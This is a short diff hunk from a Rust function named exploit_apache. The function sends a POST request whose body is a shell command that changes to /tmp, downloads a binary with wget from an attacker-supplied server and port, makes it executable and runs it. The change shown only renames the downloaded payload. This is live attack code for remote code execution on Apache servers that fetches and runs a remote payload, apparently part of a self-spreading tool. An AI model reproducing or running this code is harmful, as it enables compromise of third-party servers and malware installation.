@@ -41,7 +41,7 @@ pub(crate) async fn exploit_apache(target_ip: &str, srv: &str, port: &str) {
                 .arg("POST")
                 .arg("-d")
                 .arg(format!(
-                    "echo; cd /tmp && wget http://{}:{}/PA-AUTO-DISP && chmod +x PA-AUTO-DISP && ./PA-AUTO-DISP",
+                    "echo; cd /tmp && wget http://{}:{}/api/foo_shi_shi_bang && chmod +x foo_shi_shi_bang && ./foo_shi_shi_bang",
                     srv,
                     port
                 )) //ajouter ./...
